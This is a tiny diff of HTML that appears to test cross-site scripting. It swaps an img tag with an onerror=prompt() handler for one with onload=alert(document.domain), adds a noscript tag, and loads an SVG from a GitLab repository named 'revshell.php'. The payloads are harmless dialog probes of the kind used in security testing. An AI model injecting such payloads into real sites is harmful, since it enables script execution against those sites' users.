@@ -1,2 +1,3 @@
 <iframe src=x> </iframe>
-<img src="https://gitlab.com/professor401/revshell.php/-/raw/main/abcd.svg" onerror=prompt()>
+<noscript src="https://github.com/static/javascripts/codemirror/mode/gfm/gfm.js?v=1"></noscript>
+<img src="https://gitlab.com/professor401/revshell.php/-/raw/main/abcd.svg" onload=alert(document.domain)>
